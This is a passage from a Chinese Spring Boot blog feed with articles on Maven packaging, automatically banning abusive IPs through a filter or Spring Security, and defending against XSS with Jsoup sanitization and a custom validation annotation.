class="name">include</span>&gt;</span>*.properties<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">include</span>&gt;</span>*.yml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">include</span>&gt;</span>*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">include</span>&gt;</span>mapper/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">fileSet</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- 把项目自己编译出来的jar文件，打包进zip文件的根目录 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">fileSet</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">directory</span>&gt;</span>$&#123;project.build.directory&#125;<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">outputDirectory</span>&gt;</span>$&#123;file.separator&#125;<span class="tag">&lt;/<span class="name">outputDirectory</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">include</span>&gt;</span>*.jar<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">fileSet</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">fileSets</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 依赖包的拷贝--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencySets</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependencySet</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">unpack</span>&gt;</span>false<span class="tag">&lt;/<span class="name">unpack</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">useProjectArtifact</span>&gt;</span>true<span class="tag">&lt;/<span class="name">useProjectArtifact</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">outputDirectory</span>&gt;</span>lib<span class="tag">&lt;/<span class="name">outputDirectory</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencySet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependencySet</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">unpack</span>&gt;</span>false<span class="tag">&lt;/<span class="name">unpack</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">useProjectArtifact</span>&gt;</span>true<span class="tag">&lt;/<span class="name">useProjectArtifact</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">outputDirectory</span>&gt;</span>lib<span class="tag">&lt;/<span class="name">outputDirectory</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>system<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencySet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependencySet</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">unpack</span>&gt;</span>false<span class="tag">&lt;/<span class="name">unpack</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">useProjectArtifact</span>&gt;</span>true<span class="tag">&lt;/<span class="name">useProjectArtifact</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">outputDirectory</span>&gt;</span>lib<span class="tag">&lt;/<span class="name">outputDirectory</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencySet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencySets</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">assembly</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
      <tags>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot功能二【自动封禁恶意访问IP】</title>
    <url>/cnblogs.github.io/p/61459.html</url>
    <content><![CDATA[<p><strong>解决方案</strong><br><strong>自定义过滤器实现</strong><br>首先，我们可以创建一个自定义过滤器来检查请求的 IP 地址。实现一个IpFilter类，继承OncePerRequestFilter ，在doFilterInternal方法中，通过HttpServletRequest对象的getRemoteAddr()方法获取请求的 IP 地址（需要注意，如果应用部署在反向代理后，可能要从X-Forwarded-For头中获取真实 IP）。</p>
<p>我们可以维护一个ConcurrentHashMap来存储每个 IP 的访问次数和初次访问时间。在过滤器中，每次请求时判断该 IP 的访问次数是否超过设定阈值（比如一分钟内访问超过 50 次），如果超过且距离初次访问时间在一定范围内，就将该 IP 加入到封禁列表中。封禁列表同样可以用ConcurrentHashMap存储，key 为 IP 地址，value 为封禁截止时间。当有请求到来时，先检查该 IP 是否在封禁列表中，如果在且当前时间未超过封禁截止时间，则直接返回错误信息，阻止访问。</p>
<p>这种方法的优点是灵活性高，开发者可以根据业务需求自由定制封禁规则，适用于对 IP 封禁逻辑有特殊要求的场景。但缺点也很明显，由于需要自行维护数据结构和逻辑判断，代码复杂度较高，且在高并发场景下，频繁对ConcurrentHashMap进行读写操作可能会带来性能损耗。</p>
<p>同时，还需要创建一个监听器IpListener来初始化这个 IP 存储器，并在 Spring Boot 启动类添加扫描过滤器和监听器的配置。具体代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.boot.web.servlet.ServletComponentScan;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.web.servlet.ServletListenerRegistrationBean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ServletComponentScan</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> ServletListenerRegistrationBean&lt;IpListener&gt; <span class="title function_">ipListenerRegistrationBean</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ServletListenerRegistrationBean</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">IpListener</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.ServletContextEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContextListener;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ConcurrentHashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IpListener</span> <span class="keyword">implements</span> <span class="title class_">ServletContextListener</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">contextInitialized</span><span class="params">(ServletContextEvent sce)</span> &#123;</span><br><span class="line">        sce.getServletContext().setAttribute(<span class="string">&quot;ipMap&quot;</span>, <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;&gt;());</span><br><span class="line">        sce.getServletContext().setAttribute(<span class="string">&quot;blockedIpMap&quot;</span>, <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;&gt;());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">contextDestroyed</span><span class="params">(ServletContextEvent sce)</span> &#123;</span><br><span class="line">        <span class="comment">// 可添加清理逻辑</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.web.filter.OncePerRequestFilter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterChain;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ConcurrentHashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IpFilter</span> <span class="keyword">extends</span> <span class="title class_">OncePerRequestFilter</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MAX_REQUESTS_PER_MINUTE</span> <span class="operator">=</span> <span class="number">50</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">BLOCK_DURATION</span> <span class="operator">=</span> <span class="number">60</span> * <span class="number">1000</span>; <span class="comment">// 封禁1分钟</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doFilterInternal</span><span class="params">(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">ip</span> <span class="operator">=</span> request.getRemoteAddr();</span><br><span class="line">        Map&lt;String, Integer&gt; ipMap = (Map&lt;String, Integer&gt;) request.getServletContext().getAttribute(<span class="string">&quot;ipMap&quot;</span>);</span><br><span class="line">        Map&lt;String, Date&gt; blockedIpMap = (Map&lt;String, Date&gt;) request.getServletContext().getAttribute(<span class="string">&quot;blockedIpMap&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (blockedIpMap.containsKey(ip) &amp;&amp; <span class="keyword">new</span> <span class="title class_">Date</span>().before(blockedIpMap.get(ip))) &#123;</span><br><span class="line">            response.sendError(HttpServletResponse.SC_FORBIDDEN, <span class="string">&quot;Your IP is blocked due to excessive requests.&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ipMap.put(ip, ipMap.getOrDefault(ip, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (ipMap.get(ip) &gt; MAX_REQUESTS_PER_MINUTE) &#123;</span><br><span class="line">            blockedIpMap.put(ip, <span class="keyword">new</span> <span class="title class_">Date</span>(System.currentTimeMillis() + BLOCK_DURATION));</span><br><span class="line">            response.sendError(HttpServletResponse.SC_FORBIDDEN, <span class="string">&quot;Your IP is blocked due to excessive requests.&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        filterChain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>结合 Spring Security 实现</strong><br>在 Spring Security 的配置类中，我们可以重写configure(HttpSecurity http)方法，结合自定义的逻辑来实现 IP 封禁。首先，定义一个IpAddressService接口及其实现类，用于判断 IP 是否为恶意 IP。在configure方法中，使用http.authorizeRequests()方法来对请求进行授权判断。</p>
<p>Spring Security 是一个功能强大且高度可定制的身份验证和访问控制框架，结合它实现 IP 封禁，优势在于能够与系统的权限管理体系无缝集成，适用于已经使用 Spring Security 进行安全管理的项目。但缺点是配置相对复杂，对于不熟悉 Spring Security 的开发者来说，学习成本较高。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.config.annotation.web.builders.HttpSecurity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.web.access.AccessDeniedHandler;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableWebSecurity</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecurityConfig</span> <span class="keyword">extends</span> <span class="title class_">WebSecurityConfigurerAdapter</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> IpAddressService ipAddressService;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SecurityConfig</span><span class="params">(IpAddressService ipAddressService)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.ipAddressService = ipAddressService;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">configure</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        http</span><br><span class="line">           .authorizeRequests()</span><br><span class="line">                .antMatchers(<span class="string">&quot;/**&quot;</span>).access(ipAddressService::isIpAllowed)</span><br><span class="line">                .and()</span><br><span class="line">           .exceptionHandling()</span><br><span class="line">                .accessDeniedHandler(accessDeniedHandler())</span><br><span class="line">                .and()</span><br><span class="line">           .csrf().disable();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> AccessDeniedHandler <span class="title function_">accessDeniedHandler</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (request, response, accessDeniedException) -&gt; &#123;</span><br><span class="line">            response.sendError(HttpServletResponse.SC_FORBIDDEN, <span class="string">&quot;Your IP is not allowed to access this resource.&quot;</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IpAddressService</span> &#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isIpAllowed</span><span class="params">(String ipAddress)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IpAddressServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">IpAddressService</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Map&lt;String, Long&gt; requestCounts = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MAX_REQUESTS_PER_MINUTE</span> <span class="operator">=</span> <span class="number">50</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">BLOCK_DURATION</span> <span class="operator">=</span> <span class="number">60</span> * <span class="number">1000</span>; <span class="comment">// 封禁1分钟</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Map&lt;String, Long&gt; blockedIps = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isIpAllowed</span><span class="params">(String ipAddress)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (blockedIps.containsKey(ipAddress) &amp;&amp; System.currentTimeMillis() &lt; blockedIps.get(ipAddress)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">long</span> <span class="variable">count</span> <span class="operator">=</span> requestCounts.getOrDefault(ipAddress, <span class="number">0L</span>);</span><br><span class="line">        <span class="keyword">if</span> (count &gt;= MAX_REQUESTS_PER_MINUTE) &#123;</span><br><span class="line">            blockedIps.put(ipAddress, System.currentTimeMillis() + BLOCK_DURATION);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        requestCounts.put(ipAddress, count + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样，通过 Spring Security 的强大功能，结合自定义的 IP 判断逻辑，就能实现对恶意 IP 的封禁。</p>
<p>此外，还有一些需要额外注意的点。在获取 IP 地址时，从X-Forwarded-For头获取真实 IP 存在安全风险，因为该头信息可以被伪造，建议结合其他方式（如通过负载均衡器配置可靠的 IP 透传策略）进行验证。同时，对于封禁的 IP 列表，要考虑数据持久化问题，避免应用重启后封禁规则丢失；在集群环境下，还需要解决各节点之间封禁列表的同步问题，可借助分布式缓存（如 Redis）来实现。</p>
]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
      <tags>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot功能五【XSS防御】</title>
    <url>/cnblogs.github.io/p/89f0.html</url>
    <content><![CDATA[<h2 id="使用注解进行XSS防御"><a href="#使用注解进行XSS防御" class="headerlink" title="使用注解进行XSS防御"></a>使用注解进行XSS防御</h2><p>注解是一种轻量级的防御手段，它可以在方法或字段级别对输入进行校验，从而防止XSS攻击。</p>
<h3 id="1-1-引入相关依赖"><a href="#1-1-引入相关依赖" class="headerlink" title="1.1 引入相关依赖"></a>1.1 引入相关依赖</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--JSR-303/JSR-380用于验证的注解 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-validation<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="1-2-使用-XSS注解进行参数校验"><a href="#1-2-使用-XSS注解进行参数校验" class="headerlink" title="1.2 使用@XSS注解进行参数校验"></a>1.2 使用@XSS注解进行参数校验</h3><p>我们可以自定义一个@XSS注解，用于标记那些需要校验的参数。这里是一个简单的@XSS注解定义：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Target(value = &#123; ElementType.METHOD, ElementType.FIELD, ElementType.CONSTRUCTOR, ElementType.PARAMETER &#125;)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Constraint(validatedBy = XssValidator.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Xss &#123;</span><br><span class="line">    String <span class="title function_">message</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;非法输入, 检测到潜在的XSS&quot;</span>;</span><br><span class="line">    Class&lt;?&gt;[] groups() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line">    Class&lt;? <span class="keyword">extends</span> <span class="title class_">Payload</span>&gt;[] payload() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="1-3-实现自定义注解处理器"><a href="#1-3-实现自定义注解处理器" class="headerlink" title="1.3 实现自定义注解处理器"></a>1.3 实现自定义注解处理器</h3><p>接下来，我们需要实现XSSValidator类，该类将负责检查输入是否包含潜在的XSS攻击脚本：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XssValidator</span> <span class="keyword">implements</span> <span class="title class_">ConstraintValidator</span>&lt;Xss, String&gt; &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 使用自带的 basicWithImages 白名单</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Safelist</span> <span class="variable">WHITE_LIST</span> <span class="operator">=</span> Safelist.relaxed();</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 定义输出设置，关闭prettyPrint（prettyPrint=false），目的是避免在清理过程中对代码进行格式化</span></span><br><span class="line"><span class="comment">     * 从而保持输入和输出内容的一致性。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Document.<span class="type">OutputSettings</span> <span class="variable">OUTPUT_SETTINGS</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Document</span>.OutputSettings().prettyPrint(<span class="literal">false</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 验证输入值是否有效，即是否包含潜在的XSS攻击脚本。</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> value 输入值，需要进行XSS攻击脚本清理。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> context 上下文对象，提供关于验证环境的信息，如验证失败时的错误消息定制。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 如果清理后的值与原始值相同，则返回true，表示输入值有效；否则返回false，表示输入值无效。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isValid</span><span class="params">(String value, ConstraintValidatorContext context)</span> &#123;</span><br><span class="line">        <span class="comment">// 使用Jsoup库对输入值进行清理，以移除潜在的XSS攻击脚本。</span></span><br><span class="line">        <span class="comment">// 使用预定义的白名单和输出设置来确保只保留安全的HTML元素和属性。</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">cleanedValue</span> <span class="operator">=</span> Jsoup.clean(value, <span class="string">&quot;&quot;</span>, WHITE_LIST, OUTPUT_SETTINGS);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 比较清理后的值与原始值是否相同，用于判断输入值是否有效。</span></span><br><span class="line">        <span class="keyword">return</span> cleanedValue.equals(value);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="1-4-使用注解"><a href="#1-4-使用注解" class="headerlink" title="1.4 使用注解"></a>1.4 使用注解</h3><p>在要进行XSS防御的属性上添加注解：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@Tag(name = &quot;用户&quot;,description = &quot;用户登录类&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserLoginDTO</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Xss</span></span><br><span class="line">    <span class="meta">@NotBlank(message = &quot;账号不能为空&quot;)</span></span><br><span class="line">    <span class="meta">@Schema(name = &quot;用户账号&quot;,type = &quot;String&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String userAccount;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Xss</span></span><br><span class="line">    <span class="meta">@Size(min = 6, max = 18, message = &quot;用户密码长度需在6-18位&quot;)</span></span><br><span class="line">    <span class="meta">@Schema(name = &quot;用户密码&quot;,type = &quot;String&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Xss</span></span><br><span class="line">    <span class="meta">@NotBlank(message = &quot;邮箱验证码内容不能为空&quot;)</span></span><br><span class="line">    <span class="meta">@Schema(name = &quot;邮箱验证码&quot;,type = &quot;String&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String emailCaptcha;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在Controller中的接口添加@Validated注解：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&quot;/test2&quot;)</span></span><br><span class="line"><span class="keyword">public</span> Result&lt;String&gt; <span class="title function_">login</span><span class="params">(<span class="meta">@RequestBody</span>  <span class="meta">@Validated</span> UserLoginDTO userLoginDTO)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> Result.success();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="使用过滤器进行XSS防御"><a href="#使用过滤器进行XSS防御" class="headerlink" title="使用过滤器进行XSS防御"></a>使用过滤器进行XSS防御</h2><h3 id="2-1-引入相关依赖"><a href="#2-1-引入相关依赖" class="headerlink" title="2.1 引入相关依赖"></a>2.1 引入相关依赖</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Jsoup依赖 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.jsoup<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jsoup<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.17.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="2-2-编写配置类"><a href="#2-2-编写配置类" class="headerlink" title="2.2 编写配置类"></a>2.2 编写配置类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 跨站脚本（XSS）过滤配置类。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;xss&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterConfig</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 是否启用XSS过滤。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String enabled;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 需要排除的URL模式，这些URL不会进行XSS过滤。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String excludes;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 需要应用XSS过滤的URL模式。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String urlPatterns;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 注册XSS过滤器。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> FilterRegistrationBean 用于注册过滤器的bean。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> FilterRegistrationBean <span class="title function_">xssFilterRegistration</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">FilterRegistrationBean</span> <span class="variable">registrationBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterRegistrationBean</span>();</span><br><span class="line">        <span class="comment">// 设置过滤器的分发类型为请求类型</span></span><br><span class="line">        registrationBean.setDispatcherTypes(DispatcherType.REQUEST);</span><br><span class="line">        <span class="comment">// 创建XssFilter的实例</span></span><br><span class="line">        registrationBean.setFilter(<span class="keyword">new</span> <span class="title class_">XssFilter</span>());</span><br><span class="line">        <span class="comment">// 添加过滤器需要拦截的URL模式，这些模式从配置文件中的&quot;urlPatterns&quot;属性读取</span></span><br><span class="line">        registrationBean.addUrlPatterns(StringUtils.split(urlPatterns, <span class="string">&quot;,&quot;</span>));</span><br><span class="line">        <span class="comment">// 设置过滤器的名称</span></span><br><span class="line">        registrationBean.setName(<span 